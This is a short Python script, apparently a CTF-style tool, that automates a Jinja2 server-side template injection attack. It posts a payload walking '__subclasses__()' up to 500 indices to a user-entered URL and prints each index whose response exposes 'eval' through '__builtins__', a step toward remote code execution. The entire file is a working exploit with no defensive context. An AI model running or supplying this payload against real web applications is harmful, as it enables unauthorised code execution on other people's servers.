import requests

url = input("请输入你的URL链接")
for i in range(500):
    data = {"name":
                "{{().__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__['__builtins__']}}"}
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            if 'eval' in response.text:
                print(i)
    except:
        pass
